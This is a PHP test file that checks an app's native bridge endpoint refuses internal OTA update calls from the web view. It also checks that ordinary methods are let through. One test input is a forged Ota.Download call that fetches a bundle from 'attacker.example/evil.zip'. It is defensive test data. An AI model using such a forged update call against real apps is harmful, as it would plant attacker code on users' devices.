<?php

/**
 * /_native/api/call has no middleware and is reachable by web view script.
 * OTA download+apply is app-logic, not a page action — app PHP drives it
 * in-process via nativephp_call, which does not pass through this controller —
 * so the controller refuses the internal `Ota.` prefix from a web view with a
 * 403 before anything else runs. A forged Ota.Download would otherwise take an
 * attacker-chosen URL and stage a bundle the app runs on next boot.
 */
it('refuses an internal OTA bridge call from the web view', function (array $call) {
    $this->postJson('/_native/api/call', $call)
        ->assertStatus(403)
        ->assertJson([
            'status' => 'error',
            'code' => 'INTERNAL_METHOD',
        ]);
})->with([
    'an OTA download from an attacker URL' => [['method' => 'Ota.Download', 'params' => ['url' => 'https://attacker.example/evil.zip', 'sha256' => 'deadbeef']]],
    'an OTA apply' => [['method' => 'Ota.Apply', 'params' => []]],
    'an OTA rollback' => [['method' => 'Ota.Rollback', 'params' => []]],
]);

it('lets a non-internal bridge call past the internal-prefix gate', function () {
    // The method is dispatched onward (what the device-less test bridge then
    // does with it is beside the point) — it is not met with the internal
    // refusal, which is scoped to the internal prefixes alone.
    $response = $this->postJson('/_native/api/call', ['method' => 'Camera.GetPhoto', 'params' => []]);

    expect($response->status())->not->toBe(403);
    expect($response->json('code'))->not->toBe('INTERNAL_METHOD');
});

it('does not refuse a method that merely contains the internal prefix elsewhere', function () {
    // The prefix is matched at the start only, so an app method whose name
    // happens to contain "Ota." later is not an internal call.
    $response = $this->postJson('/_native/api/call', ['method' => 'Quota.Check', 'params' => []]);

    expect($response->status())->not->toBe(403);
    expect($response->json('code'))->not->toBe('INTERNAL_METHOD');
});
